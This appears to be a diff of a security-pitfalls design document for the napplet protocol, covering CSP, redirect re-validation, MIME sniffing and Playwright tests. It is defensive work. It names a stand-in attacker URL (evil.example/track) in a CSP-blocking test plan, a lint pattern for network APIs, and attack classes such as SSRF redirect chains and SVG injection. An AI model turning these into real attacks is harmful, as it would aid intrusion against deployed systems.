+A third variant: napplet asks for URL A, attacker controls A → A 302→ B 302→ A 302→ B (loop). Shell exhausts redirect budget, returns error. Resource bandwidth wasted.
+
+**Severity:** SERIOUS (privacy/security; the napplet's URL ≠ the actual fetch target).
 
 **Prevention:**
-- NUB-CONFIG MUST specify: `config.openSettings` is a REQUEST, not a command. Shells MAY ignore, delay, batch, or rate-limit calls at their discretion. Napplets MUST NOT assume calling openSettings guarantees the settings UI appears.
-- NUB-CONFIG MUST specify: shells SHOULD only honor `config.openSettings` when the calling napplet has (or would have) user focus — not for background napplets
-- NUB-CONFIG MAY specify a soft rate-limit suggestion (non-normative): shells MAY ignore repeated calls within 1s of the previous
-- NUB-CONFIG MUST NOT define a response/ack — the napplet cannot rely on confirmation
+- NUB-RESOURCE spec MUST specify: "Each redirect followed by the shell's URL handler MUST be re-validated against the shell's resource policy (private IP block, scheme whitelist, rate limit). Shells MUST cap the redirect chain at 5 (default). Shells MUST NOT follow cross-origin redirects without re-validation."
+- NUB-RESOURCE spec MAY specify: "Shells MAY return the final resolved URL to the napplet as a `finalUrl` field on the `resource.bytes.result` envelope. If included, napplets can detect cross-origin redirects."
+- Reference shim MUST log all redirects in dev mode for developer awareness.
 
-**Phase:** SPEC (non-normative guidance), INTEGRATION (reference shim rate-limits)
+**Phase:** SPEC (redirect chain cap + re-validation MUST), IMPL (custom fetch that validates each hop), VERIFY (redirect-loop and redirect-to-private-IP tests)
 
-**Confidence:** MEDIUM — pattern observed in keys NUB research; protection principle transfers cleanly.
+**Confidence:** HIGH.
 
 ---
 
-### Pitfall 18: `openSettings({ section })` Deep-Link to Nonexistent Section
+### Pitfall 18: Vite Dev HMR Requires `connect-src ws://` — CSP Conflict
 
-**What goes wrong:** Napplet calls `config.openSettings({ section: "billing" })`. Shell's renderer has no "billing" section (napplet's schema uses different section names, OR the napplet is on an older/newer version than the shell expected). Shell either: shows an empty panel, shows the wrong panel, or silently ignores the request. Napplet author can't tell what happened.
+**What goes wrong:** The [vite #11862 issue](https://github.com/vitejs/vite/issues/11862) and [#15404](https://github.com/vitejs/vite/issues/15404) confirm: Vite's HMR client uses a WebSocket to the dev server, requires `connect-src` to include `ws://localhost:*`, AND injects inline scripts requiring `script-src 'unsafe-inline'` or nonce-based scripts. The whole point of v0.28.0's strict CSP is `connect-src 'none'` — directly conflicts with HMR.
 
-**Why it happens:** `section` is a string that both sides must agree on — the napplet's schema declares `x-napplet-section: "billing"` on some property, and openSettings expects that string to match. If schema and code drift, deep-linking breaks.
+A naive solution: "in dev mode, allow `ws://localhost:5173`." But the napplet runs INSIDE an iframe served from a different URL than the dev server; the iframe's CSP needs to allow connecting to the dev server, which means the napplet has a `connect-src` that DOES allow some connections — defeating the strict-isolation premise during development.
 
-**Scope classification:** **SPEC concern** (define the matching rule) + **SHELL concern** (error UX).
+**Severity:** SERIOUS (developer experience; if dev mode requires laxity, devs build with laxer policies and the prod policy diverges → bugs).
 
 **Prevention:**
-- NUB-CONFIG MUST specify: the `section` argument to openSettings matches the `x-napplet-section` value on one or more properties in the napplet's registered schema. If no property has that section, behavior is shell-defined (SHOULD show the top of settings; MAY silently ignore).
-- NUB-CONFIG SHOULD specify: shells SHOULD NOT send an error back to the napplet for unknown section (to avoid leaking shell internals). If the spec allows an ack, it's a fire-and-forget ack ("request received," not "section found").
-- NUB-CONFIG MUST specify: `section` is case-sensitive, trimmed, and not interpreted as HTML/path — just an opaque string matched against `x-napplet-section` values
+- Vite-plugin MUST emit two distinct CSPs: a dev CSP that allows HMR (with explicit dev-mode ws:// connect-src), and a build CSP that is strict (`connect-src 'none'`).
+- Vite-plugin MUST include a build-time assertion: dev-mode CSP additions MUST NOT appear in the build manifest. If they do, fail the build.
+- Vite-plugin SHOULD emit a console warning at dev startup: "DEV MODE CSP ALLOWS ws:// FOR HMR — production build will be strict."
+- NIP-5D §Security amendment SHOULD note: "Development tooling (e.g. HMR) may require relaxed CSP. Tooling MUST emit production builds with the strict policy and MUST surface dev-mode relaxations to the developer."
+- Skill docs MUST include a "verify your build CSP" checklist.
 
-**Phase:** SPEC (matching rule)
+**Phase:** SPEC (note dev/prod separation), IMPL (vite-plugin two-mode CSP + assertion), DOCS (skill verification)
 
-**Confidence:** MEDIUM
+**Confidence:** HIGH.
 
 ---
 
-### Pitfall 19: `format` Validators — Inconsistent Support Across Shells
+### Pitfall 19: Vite Inline Scripts and `<script type="module">` Need Nonces
 
-**What goes wrong:** Napplet declares `{ email: { type: "string", format: "email" } }`. Shell A uses `ajv` with `ajv-formats` — real validation. Shell B uses a minimal validator that treats `format` as a hint only. Shell C uses a regex for email that accepts "foo@bar" but rejects "foo@bar.co.uk" (notorious email regex bug).
+**What goes wrong:** Per [vite #9719](https://github.com/vitejs/vite/issues/9719) and [#15404](https://github.com/vitejs/vite/issues/15404), Vite's `__vitePreload` injects inline scripts. Without `'unsafe-inline'` in `script-src`, these are blocked. Modern guidance is to use nonces, but Vite's nonce support requires opt-in via a `meta[property=csp-nonce]` element AND a compatible HTML plugin.
 
-**Why it happens:** JSON Schema `format` is annotative by default in draft-07+. Validators vary hugely on which formats they enforce and how strictly.
+If the napplet's CSP has `script-src 'self'` only, Vite's preload script is blocked, the napplet fails to load any chunked module, and the napplet appears broken with a console error nobody reads.
 
-**Scope classification:** **SPEC concern** (declare `format` is hint-only in NUB-CONFIG).
+**Severity:** SERIOUS (napplets ship broken if CSP is too strict for Vite's runtime).
 
 **Prevention:**
-- NUB-CONFIG MUST specify: `format` is a HINT for UI rendering (input type, autocomplete), NOT a validation requirement. Shells MUST NOT reject a value solely because it fails `format`.
-- NUB-CONFIG SHOULD enumerate a list of recognized `format` hints that shells SHOULD render with appropriate UI: `email`, `uri`, `date`, `time`, `date-time`, `color`, `ipv4`, `ipv6`
-- Napplets requiring strict validation MUST use `pattern` (with ReDoS protection per Pitfall 4), `minLength`, `maxLength`, or `enum` — not `format`
-- NUB-CONFIG MUST NOT mandate any format validation library
+- Vite-plugin MUST set up nonce-based CSP by default: generate a nonce per build, inject `<meta property="csp-nonce" content="...">` in `<head>` AS THE FIRST CHILD (per Pitfall 1), set `script-src 'nonce-...' 'self'` (NOT `'unsafe-inline'`).
+- Vite-plugin MUST NOT use `'unsafe-eval'` ever. Vite's production builds don't need it; if a dev mode requires it, document and warn.
+- Reference shim MUST avoid `eval`, `new Function()`, and template strings that compile to eval.
+- Test suite MUST include a CSP-violation-zero assertion: load a built napplet, capture console, fail if any CSP violation appears.
 
-**Phase:** SPEC (format as hint, enumerate known formats)
+**Phase:** IMPL (vite-plugin nonce setup), VERIFY (zero-CSP-violation test)
 
-**Confidence:** HIGH — JSON Schema draft-07+ makes `format` annotative by default.
+**Confidence:** HIGH.
 
 ---
 
-## Minor Pitfalls (LOW severity)
+### Pitfall 20: Source Map and Dynamic Import Fetches Need Explicit CSP Allowance
 
-### Pitfall 20: Duplicate `config.registerSchema` Within a Session
+**What goes wrong:** Vite emits source maps in dev (and optionally in prod). Browser fetches them via the URL in `//# sourceMappingURL=...`. If `connect-src` blocks the source map fetch, dev tools show "no source map" — degraded debugging but not broken.
 
-**What goes wrong:** Napplet calls registerSchema twice, or three times, during its lifecycle (e.g. lazy-load of a feature that extends config). Each call potentially changes the schema. What happens to in-flight subscribe deliveries? What about user values already entered against the old schema?
+Dynamic import (`import('./module.js')`) loads a chunk via the browser's module loader. Per CSP, this needs `script-src` to allow the URL. If the napplet bundles all chunks under the napplet's origin and `script-src 'self'` is set, this works. If chunks come from a CDN or different origin, the CSP needs explicit allowance.
 
-**Why it happens:** Napplets may have dynamic features; schema may legitimately grow. But the spec could interpret "duplicate" either as "replace completely" or "merge."
+`import.meta.url` is a string, not a fetch — no CSP impact directly. But if napplet code uses `new URL(asset, import.meta.url)` and then `fetch(url)`, the fetch IS subject to `connect-src` — and `resource.bytes()` is the only sanctioned fetch path in v0.28.0.
 
-**Scope classification:** **SPEC concern** (pick a semantic).
+**Severity:** SERIOUS for non-trivial napplets; ANNOYANCE for hello-world.
 
 **Prevention:**
-- NUB-CONFIG MUST specify: each `config.registerSchema` call REPLACES the previous schema completely for that napplet's scope. No merging.
-- NUB-CONFIG MUST specify: replacement triggers the same orphan-value handling as schema evolution (Pitfalls 5 and 15)
-- NUB-CONFIG SHOULD recommend napplets call registerSchema exactly once, at startup, immediately after shim initialization
-- Manifest-declared schema (via vite-plugin) SHOULD take precedence and MAY prohibit runtime registerSchema entirely — that's a shell policy
+- Vite-plugin MUST configure default CSP with `script-src 'self' 'nonce-...'` to allow chunked module loading.
+- Vite-plugin MUST emit source maps with same-origin URLs in dev; configure prod source maps to be `external` (separate file) or `inline`.
+- Skill docs MUST cover the migration: "any code using `fetch(...)` MUST migrate to `window.napplet.resource.bytes(url)`. Dynamic `import()` of static modules continues to work."
+- Lint rule (in vite-plugin or a separate package) SHOULD detect `fetch(`, `new XMLHttpRequest()`, `new WebSocket(`, `new EventSource(` in napplet source and emit an error/warning pointing to `resource.bytes()`.
 
-**Phase:** SPEC (replace semantics)
+**Phase:** IMPL (vite-plugin CSP + lint), DOCS (migration guide)
 
-**Confidence:** HIGH
+**Confidence:** HIGH.
 
 ---
 
-### Pitfall 21: `x-napplet-order` Collision / Non-Integer / Missing
+### Pitfall 21: Playwright Auto-Wait Doesn't Catch CSP Violations Silently
 
-**What goes wrong:** Two properties both declare `x-napplet-order: 1`. Or a property declares `x-napplet-order: "first"` (string, not number). Or most properties omit it. Shell renderer has to pick an order — alphabetical? declaration order? object-key order (implementation-dependent)?
+**What goes wrong:** Playwright tests like `await page.goto(url); await expect(page.locator('img')).toBeVisible()` will pass if the `<img>` element is in the DOM with width/height — even if the image's `src` attribute points to a CSP-blocked URL and no actual bytes loaded. CSP violations report to console (and to `report-uri` if set, but per Pitfall 2 that's header-only). They do NOT throw; the page does NOT fail.
 
-**Scope classification:** **SPEC concern** (state the rules).
+A test that's meant to verify "this napplet's CSP blocks `https://evil.example/track`" needs to:
+1. Load the napplet and trigger the offending fetch.
+2. Listen on `page.on('console')` for the CSP violation message.
+3. Listen on `page.on('requestfailed')` for the network event.
+4. Correlate: the CSP violation message AND the request failure must reference the same URL.
+5. Assert the URL never reached the server (if testing against a real upstream).
+
+A weaker (but acceptable) test is to assert `page.on('request')` DID NOT fire for the URL — but in modern browsers, CSP-blocked requests still fire `requestfailed`, not absence.
+
+**Severity:** SERIOUS for the verification phase. If the tests don't actually verify blocking, the milestone ships with the warm fuzzy feeling of CSP without proof.
 
 **Prevention:**
-- NUB-CONFIG MUST specify `x-napplet-order` is a finite non-negative number (integer or float; floats allow "insert between 1 and 2" as 1.5)
-- NUB-CONFIG MUST specify ordering rule: properties with `x-napplet-order` set come first, sorted ascending. Ties broken by property key alphabetical order. Properties without `x-napplet-order` come after, sorted alphabetically.
-- Shells MAY render in a different order for accessibility (e.g. grouping by section first) — `x-napplet-order` is a HINT within a section
-- Vite-plugin MAY warn on ordering collisions at build time
+- Verification phase MUST include a CSP-blocked-request helper that returns the exact set of URLs blocked by CSP during a test.
+- Helper MUST use `page.on('console')` filtered to CSP violation reports AND `page.on('requestfailed')` correlated by URL.
+- Helper MUST also use [Playwright's `page.cspErrorsAsync()`](https://playwright.dev/docs/api/class-page) (where available) for direct CSP violation enumeration.
+- Tests MUST assert positive blocking: "after attempting to fetch X, exactly one CSP violation for X appears in the console."
+- A negative-control test MUST verify: "tests using CSP bypass (`bypassCSP: true` browser context) confirm the URL would otherwise succeed." This proves the test infrastructure can distinguish "CSP blocked" from "URL is unreachable."
 
-**Phase:** SPEC (ordering rule)
+**Phase:** VERIFY (helper + test patterns)
 
-**Confidence:** MEDIUM
+**Confidence:** HIGH.
 
 ---
 
-### Pitfall 22: Clock-Synchronized Defaults / "Random" Defaults
+## Annoyance Pitfalls (ANNOYANCE severity)
 
-**What goes wrong:** Napplet author wants a default that's `Date.now()` or a random UUID. JSON Schema has no way to express this. Napplet ends up either: (a) hardcoding a literal value (bad for UUID), (b) leaving `default` off and hoping user sets it, (c) treating "not yet set" as a special sentinel.
+### Pitfall 22: SharedArrayBuffer Requires Cross-Origin Isolation — Conflicts with Sandbox
 
-**Why it happens:** JSON Schema defaults are literal values, not expressions. There's no SQL-like DEFAULT NOW().
+**What goes wrong:** Per [MDN COOP/COEP](https://web.dev/articles/coop-coep) and [Stackblitz cross-browser COOP/COEP post](https://blog.stackblitz.com/posts/cross-browser-with-coop-coep/), SharedArrayBuffer requires the document to be cross-origin isolated (COOP same-origin + COEP require-corp). For a sandboxed iframe (`allow-scripts` only, no `allow-same-origin`), the iframe's origin is opaque/unique, and combining COOP/COEP with sandbox requires `allow="cross-origin-isolated"` on the iframe + matching COEP from the napplet's served HTML. This is achievable but brittle.
 
-**Scope classification:** **SPEC concern** (state the limitation; don't invent a new expression language).
+Audio/video are explicitly out of scope for v0.28.0, so SharedArrayBuffer (typically wanted for ffmpeg-wasm, audio worklets, etc.) is not blocking. But if a napplet author tries to use it, it'll silently degrade — no SharedArrayBuffer, just regular ArrayBuffer.
+
+**Severity:** ANNOYANCE for v0.28.0; will become SERIOUS when audio/video lands.
 
 **Prevention:**
-- NUB-CONFIG MUST state: `default` values are literal JSON values per JSON Schema draft-07 semantics. There is no expression evaluation.
-- Napplets needing runtime-generated defaults MUST handle "value is undefined" in their own code — treat it as "compute a default on first use, and the user will see it as soon as they open settings."
-- NUB-CONFIG MUST NOT invent syntactic sugar like `"default": "$now()"` — violates scope and creates a footgun
+- NIP-5D §Security amendment MAY note: "SharedArrayBuffer requires cross-origin isolation. Shells delivering napplet HTML in sandboxed iframes typically cannot satisfy COOP/COEP requirements; napplets requiring SharedArrayBuffer are not supported in v0.28.0. A future revision will address this when audio/video shipping requires WASM workers."
+- Vite-plugin SHOULD detect SharedArrayBuffer references in napplet source and warn.
 
-**Phase:** SPEC (explicit statement)
+**Phase:** SPEC (note as out-of-scope), IMPL (lint warning)
 
-**Confidence:** HIGH
+**Confidence:** MEDIUM — depends on browser implementation evolution.
 
 ---
 
-### Pitfall 23: i18n — Schema `title` / `description` Are String-Only
+### Pitfall 23: Default CSP Misses `font-src` / `img-src blob:` → Fonts Don't Load
 
-**What goes wrong:** Napplet wants to ship multi-language settings. JSON Schema `title` / `description` are single strings. Shells have no way to pick a locale. Napplet ships English only; Japanese users see English labels.
+**What goes wrong:** Default `default-src 'none'` blocks everything. Adding only `script-src` and `connect-src` rules misses `font-src` (web fonts), `img-src` (images, including data: and blob:), `style-src` (CSS), `media-src` (audio/video — out of scope for v0.28.0). Napplet loads, scripts run, fetches succeed via resource broker, but `<img>` tags are blank because `img-src 'none'` blocks even blob: URLs the napplet creates.
 
-**Why it happens:** JSON Schema is not i18n-aware.
-
-**Scope classification:** **SHELL concern** (renderer); NUB-CONFIG can mention but should NOT try to solve.
+**Severity:** ANNOYANCE (devs see broken images, file bugs, eventually figure it out).
 
 **Prevention:**
-- NUB-CONFIG Non-normative section: acknowledge i18n is out of scope for v1
-- NUB-CONFIG MAY reserve `x-napplet-i18n` as a future extension without defining it in v1
-- NUB-CONFIG MUST NOT invent a locale-map schema extension in v1 — scope creep
+- Vite-plugin's default CSP MUST be a complete, opinionated baseline:
+  - `default-src 'none'`
+  - `script-src 'self' 'nonce-...'`
+  - `style-src 'self' 'unsafe-inline'` (or nonce-based; UnoCSS / inline `<style>` may need this)
+  - `img-src 'self' blob: data:` (blob and data for resource-broker-delivered images)
+  - `font-src 'self' blob: data:`
+  - `connect-src 'none'`
+  - `worker-src 'none'` (per Pitfall 4)
+  - `frame-src 'none'`
+  - `object-src 'none'`
+  - `base-uri 'self'`
+  - `form-action 'none'`
+- Vite-plugin MUST allow napplets to extend (not relax) via opt-in additions, e.g. add a font CDN to `font-src`. MUST refuse to relax `connect-src` from `'none'`.
+- Skill docs MUST include the baseline CSP and explain each directive.
 
-**Phase:** SPEC (acknowledge out of scope)
+**Phase:** IMPL (vite-plugin baseline), DOCS (CSP explanation skill)
 
-**Confidence:** HIGH (by omission — deliberately deferred)
+**Confidence:** HIGH.
 
 ---
 
-### Pitfall 24: Vite-Plugin Injects Invalid JSON Schema into Manifest
+### Pitfall 24: MIME Sniffing Disagreement — Shell Says PNG, Browser Says HTML
 
-**What goes wrong:** Vite-plugin builds the NIP-5A manifest with a config schema. Napplet's schema has a typo (`{ type: "strng" }`). Manifest ships. Shell loads it, fails at registerSchema time with a cryptic error. Napplet author doesn't see the error until runtime.
+**What goes wrong:** Shell fetches a "PNG" from a URL. Upstream sets `Content-Type: image/png` but the bytes are actually HTML (`<script>...`). Shell trusts the header and delivers as PNG MIME. Napplet creates `<img src="blob:url">`; browser sniffs the bytes, decides "this is HTML," and per `X-Content-Type-Options: nosniff` semantics may render as HTML in some contexts (if the napplet uses `<iframe srcdoc>` or similar).
 
-**Scope classification:** **PACKAGE concern** (vite-plugin side).
+Within the napplet's sandboxed iframe with strict CSP, the damage from a content-type confusion is limited (no scripts execute outside the napplet's nonce-allowlist), but the user gets a broken image AND the napplet may make decisions based on the wrong MIME.
+
+**Severity:** ANNOYANCE for v0.28.0 (sandbox limits the damage); SERIOUS in environments where shell delivers bytes outside the iframe sandbox (e.g. download path).
 
 **Prevention:**
-- Vite-plugin MUST run the schema through a JSON-Schema-meta-schema validator at build time
-- Vite-plugin MUST also run the NUB-CONFIG subset checker (Pitfalls 1-4 checks — forbidden features, depth limit, ReDoS-prone patterns, `$ref` URIs, additionalProperties default, secret+default coexistence)
-- Build fails if schema is invalid — no shipping broken manifests
-- Reference this in the nub-config package README
+- NUB-RESOURCE spec MUST specify: "Shells MUST byte-sniff resource content to determine MIME type; the upstream Content-Type header is a HINT, not authoritative. Shells MUST set `X-Content-Type-Options: nosniff` semantics on delivery (i.e. the delivered MIME is the shell's classified MIME, which the napplet MUST treat as authoritative)."
+- NUB-RESOURCE spec MUST specify a MIME classification table: e.g. PNG/JPEG/WebP/AVIF/SVG → `image/*`; OGG/MP3/M4A → `audio/*` (out of scope, classify but reject); MP4/WebM → `video/*` (out of scope); HTML/JS/CSS → REJECT (untrusted active content); PDF → reject by default; everything else → `application/octet-stream` with napplet opt-in.
+- Reference shim MUST use a battle-tested sniffer (e.g. file-type library) with explicit allowlist.
 
-**Phase:** PACKAGE (vite-plugin)
+**Phase:** SPEC (sniffing rules), IMPL (sniffer)
 
-**Confidence:** HIGH
+**Confidence:** HIGH.
 
 ---
 
-### Pitfall 25: Public-Repo Leakage — Spec References @napplet/* Packages
+### Pitfall 25: Headless Chromium CSP Behavior Diverges from Headed in Edge Cases
 
-**What goes wrong:** The NUB-CONFIG spec (napplet/nubs#13, PUBLIC repo) gets written with references like "See `@napplet/nub-config` package for reference implementation" or "Implementations: `@napplet/nub-config`." This violates the private-repo boundary per `feedback_no_implementations` and `feedback_no_private_refs_commits` memories.
+**What goes wrong:** Per general Chromium issue patterns and various SO threads, headless Chromium has historically had subtle differences in how some CSP edge cases (especially mixed-content and frame embedding) report. Modern headless (Chromium 110+ "new headless") matches headed more closely, but rare divergences exist.
 
-**Why it happens:** The agent drafts spec and package in the same session. Cross-references feel natural. Memory compliance requires active vigilance.
-
-**Scope classification:** **SPEC concern** + **DOCS concern** (process rule).
+**Severity:** ANNOYANCE (occasional false-positive or false-negative in CI tests).
 
 **Prevention:**
-- NUB-CONFIG spec Implementations section MUST be `(none yet)` — no exceptions
-- NUB-CONFIG spec body MUST NOT mention `@napplet/*`, "the reference shim," "the napplet package," or any private-repo artifact
-- Commit messages in the napplet/nubs repo MUST describe the protocol change only — never reference private packages
-- PR body in nubs repo MUST describe the wire contract — never link to the private @napplet repo
-- Cross-references (private napplet repo → public nub spec) are fine — the napplet repo's own READMEs MAY link to napplet/nubs#13
-- Reverse is NOT fine — nubs#13 MUST NOT link back
+- Verification phase MUST run CSP-related tests in headed mode at least once per release (manual or scheduled CI job).
+- Per [`AGENTS.md` headless requirements](#), Playwright tests run headless by default; the CSP test suite MUST be tagged `@csp` so it can be selectively run headed for verification.
 
-**Phase:** SPEC (discipline), DOCS (process)
+**Phase:** VERIFY (test tagging + scheduled headed run)
 
-**Confidence:** HIGH — matches explicit memory entries.
+**Confidence:** MEDIUM — historically a problem; mostly resolved.
 
 ---
 
-### Pitfall 26: Missing Error Envelopes — Protocol Undefined for Failure Paths
+### Pitfall 26: Data URL Scheme Has Subtle Quirks — Length Limits, MIME Encoding
 
-**What goes wrong:** Napplet calls `config.registerSchema` with an invalid schema. What comes back? Nothing? A promise rejection? An ack with `ok: false`? If not defined in the wire spec, every shell does something different — and napplet SDK can't provide a consistent error handling story.
+**What goes wrong:** Napplet calls `resource.bytes("data:image/png;base64,iVBOR...")`. The `data:` scheme handler should return the decoded bytes synchronously. But:
+- Some browsers cap data URL length (Chrome ~2MB, Safari historically lower). Shell-mediated decoding is unbounded if the shell does the decode.
+- The MIME/charset of the data URL is napplet-supplied; if the shell trusts it, see Pitfall 24.
+- Base64-vs-percent-encoded data URLs both exist; parser must handle both.
+- Empty data URLs (`data:,`) are valid per RFC 2397 — shell must not crash.
 
-**Scope classification:** **SPEC concern**.
+**Severity:** ANNOYANCE.
 
 **Prevention:**
-- NUB-CONFIG MUST define, for EVERY napplet→shell message type, either:
-  - "fire and forget" (napplet cannot observe success/failure) — and justify why
-  - A matching `*.result` message type with `{ ok: boolean, code?: string, message?: string }` shape
-- Enumerate error codes at spec level so napplets can match on them: `no-schema`, `schema-invalid`, `schema-too-deep`, `ref-not-allowed`, `secret-with-default`, `quota-exceeded`, `rate-limited`
-- NUB-CONFIG MUST reference NIP-5D's envelope format (`{ type, ...payload }`) and not invent a new error shape
+- NUB-RESOURCE spec MUST specify: "The `data:` scheme handler decodes per RFC 2397, classifies the MIME via the same byte-sniffing rules as `https:` (Pitfall 24), and applies the same size cap (Pitfall 12)."
+- Reference shim MUST use a tested data-URL parser, not regex.
 
-**Phase:** SPEC (error catalog)
+**Phase:** SPEC (data: handler contract), IMPL (parser)
 
-**Confidence:** HIGH
+**Confidence:** HIGH.
+
+---
+
+### Pitfall 27: nostr: and blossom: Scheme Conventions Need Disambiguation
+
+**What goes wrong:** "nostr: scheme" could mean: NIP-19 entity (`nostr:npub1...`, `nostr:nevent1...`), NIP-21 URI scheme, custom napplet-protocol URI, or something else. "blossom:" could be a hash, a hash + server hint, or a server-prefixed URL. The spec MUST define exactly what URL shape is accepted by each scheme handler.
+
+If left ambiguous, two shells will implement different parsing → napplets break when moving between shells.
+
+**Severity:** ANNOYANCE → SERIOUS if shells diverge.
+
+**Prevention:**
+- NUB-RESOURCE spec MUST define the exact accepted form for each scheme:
+  - `nostr:` — accepts NIP-19 bech32 entities (npub, nprofile, nevent, naddr, note); resolves by querying relays via NUB-RELAY internally; returns the resolved bytes (e.g. profile picture URL → fetched bytes; event content → JSON bytes; etc.)
+  - `blossom:` — accepts `blossom:<sha256-hash>` or `blossom:<server-hint>/<sha256-hash>` per the Blossom spec; shell resolves via known Blossom servers; returns bytes
+  - `https:`/`http:` — standard URL; `http:` MAY be rejected by default, MUST be opt-in by shell policy
+  - `data:` — standard RFC 2397; bounded per Pitfall 26
+- NUB-RESOURCE spec MUST specify error envelope for unsupported scheme: `{ denied: 'scheme-not-supported', scheme: 'gopher' }`.
+- NUB-RESOURCE spec MUST specify that shell.supports('resource:nostr'), shell.supports('resource:blossom'), etc. are the capability strings napplets check at runtime.
+
+**Phase:** SPEC (scheme handler contracts), IMPL (per-scheme handler), VERIFY (scheme-dispatch tests)
+
+**Confidence:** HIGH.
 
 ---
 
@@ -597,14 +628,17 @@ Conversely: if storage is keyed on `dTag` alone (not hash), an older napplet ver
 
 | Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
 |---|---|---|---|
-| "JSON Schema draft-07" with no subset defined | Fast spec draft | Every shell renders differently; napplet authors can't target a subset safely | Never — the subset MUST be defined in the initial spec |
-| Allow `$ref` because "the validator handles it" | One less thing to forbid | Data exfiltration, DoS, privacy leak vectors | Never — same-document refs only |
-| Let `format` be strict validation instead of hints | Napplets get "free" email validation | Shell-to-shell inconsistency; a working napplet on Shell A breaks on Shell B | Never — `format` is hint-only |
-| Skip defining error envelopes — "just use try/catch" | Slightly smaller spec | SDK can't provide typed errors; each shell invents its own | Never — error shape MUST be in spec |
-| Don't require vite-plugin schema validation | Faster plugin code | Napplet authors ship broken schemas and discover at runtime | Only if the reference shim runs the same checks at load time (belt-and-suspenders) |
-| Treat `x-napplet-order` ties as implementation-defined | Less spec text | Properties reorder between builds for no visible reason | Never — deterministic rule required |
-| Allow napplet→shell "config.set" for convenience | DX shortcut for napplet authors | Breaks shell-sole-writer invariant, bypasses user consent UX | Never — this is the core architectural line |
-| Defer schema evolution notes to later milestone | Shorter v1 spec | First napplet upgrade breaks; authors have no guidance | Only if the milestone explicitly calls schema evolution "out of scope for v1" — otherwise non-normative note is cheap and prevents confusion |
+| Allow `connect-src https:` "until napplets migrate" | Fast rollout, no breakage | Defeats the entire milestone — browser-enforced isolation is no longer enforced | NEVER — this is the core property being shipped |
+| Skip MIME sniffing, trust upstream Content-Type | Less code | Content-type confusion attacks; broken image rendering | NEVER — sniff or reject |
+| Allow `<foreignObject>` in SVG without rasterization "because most SVG is benign" | Fewer rejected SVGs | XHTML/script injection via SVG | NEVER — rasterize or sanitize, no exceptions |
+| Cache resource bytes content-addressed by SHA-1 or MD5 "for performance" | Marginally smaller hashes | Theoretical collision; failed audits; future-proof failure | NEVER — SHA-256 minimum |
+| Pre-fetch all URLs in events as default sidecar policy | Snappy timeline UX | Privacy fingerprinting via avatar host requests | NEVER as default; document opt-in clearly |
+| Inline `'unsafe-inline'` for styles in CSP | Zero CSS migration cost | All `<style>` tags allowed including injected ones | Acceptable if `style-src` is the ONLY laxity; combined with strict `script-src` and `connect-src 'none'` the practical attack surface is small |
+| Allow `'unsafe-eval'` because Vite needed it once | Build works | Defeats CSP almost entirely; future eval-based payloads land | NEVER — switch tooling if needed |
+| Skip per-redirect re-validation "because the first hop was clean" | Simpler fetch code | Open-redirect → SSRF chain | NEVER — every hop is a fresh policy decision |
+| Don't dedupe concurrent `resource.bytes()` calls "because the cache will catch it" | Less infrastructure | First-request thundering herd; rate-limit trips at upstream | NEVER — single-flight is cheap |
+| Backwards-compat fallback: napplet can call `fetch()` if `resource.bytes` returns undefined | Smooth migration | The ONE thing this milestone exists to prevent | NEVER — hard break per project policy |
+| Hide CSP violation warnings in dev "to reduce noise" | Cleaner console | Devs ship napplets with CSP violations and discover in production | NEVER — make them louder, not quieter |
 
 ---
 
@@ -612,13 +646,20 @@ Conversely: if storage is keyed on `dTag` alone (not hash), an older napplet ver
 
 | Integration | Common Mistake | Correct Approach |
 |---|---|---|
-| Vite-plugin → manifest | Silently drop invalid schemas | Fail the build with a clear error pointing at the offending property path |
-| Shim → core dispatch | Register a `config` domain handler globally (not per-napplet-source) | Scope handlers by MessageEvent.source per NIP-5D; derive `(dTag, aggregateHash)` from source identity, never from napplet payload |
-| SDK wrapper → subscribe | Call subscribe before register returns | Chain internally: `await registerSchema(); return subscribe(cb)` — SDK convenience over spec wire order |
-| NIP-5D Known NUBs table | Add `@napplet/nub-config` as implementation | Leave "Implementations" column empty per public-repo rule |
-| Reference shim → validator library | Bundle `ajv` @ default config | Disable `$data`, disable `$ref` auto-fetch, wrap `pattern` in Worker with timeout OR use RE2-WASM |
-| Manifest parser (shell side) | Assume all `x-napplet-*` keys are known | Treat unknown `x-napplet-*` as opaque metadata; don't reject the schema |
-| `openSettings` handler | Always open modal, even if napplet is backgrounded | Only honor for the focused napplet per Pitfall 17 |
+| Vite-plugin → emitted HTML | Place CSP meta wherever the `index.html` author put it | Force as first child of `<head>` via plugin order + post-emit assertion (Pitfall 1) |
+| Vite-plugin → directive set | Include `frame-ancestors`, `report-uri` in meta CSP | Reject those directives at build time with a header-required error (Pitfall 2) |
+| Reference shim → iframe creation | Use srcdoc for napplet HTML | Use blob URL or separate origin to avoid parent CSP inheritance (Pitfall 3) |
+| Reference shim → iframe sandbox | Add `allow-same-origin` "to make storage work" | Storage is shell-mediated per NIP-5D; sandbox MUST be `allow-scripts` only (Pitfall 5) |
+| Reference shim → fetch library | Use default Node `fetch`/axios/got with no IP filter | DNS-pin + IP block + redirect re-validation; libraries default-accept private IPs (Pitfall 6) |
+| Reference shim → SVG handler | Pass SVG bytes through as `image/svg+xml` Blob | Rasterize to PNG/WebP in sandboxed worker; reject billion-laughs / `<foreignObject>` (Pitfall 7) |
+| Public NUB-RESOURCE PR → Implementations section | List `@napplet/nub/resource` | Leave `(none yet)` per `feedback_no_implementations` |
+| Cross-repo coordination | Land NUB-RESOURCE in nubs repo first; implement later | Land both in lock-step; gate milestone close on both being ready (Pitfall 8) |
+| Sidecar field on `relay.event` | Always include sidecar by default | Opt-in per shell policy; default off (Pitfall 10) |
+| Resource cache | Share across all napplets | Scope per `(dTag, aggregateHash)`; cross-scope poisoning is a privacy leak (Pitfalls 10, 14) |
+| Blob delivery | Always use Transferable | Choose Transferable above 256KB threshold; structured-clone smaller payloads to keep cache (Pitfall 12) |
+| MIME classification | Trust upstream `Content-Type` | Byte-sniff with explicit allowlist; reject HTML/JS bytes (Pitfall 24) |
+| `nostr:` scheme | Each shell parses the URL its own way | Lock parsing to NIP-19 bech32 entities in spec (Pitfall 27) |
+| Playwright CSP test | `await expect(img).toBeVisible()` | Listen on console + requestfailed; assert specific CSP violation appeared (Pitfall 21) |
 
 ---
 
@@ -626,11 +667,13 @@ Conversely: if storage is keyed on `dTag` alone (not hash), an older napplet ver
 
 | Trap | Symptoms | Prevention | When It Breaks |
 |---|---|---|---|
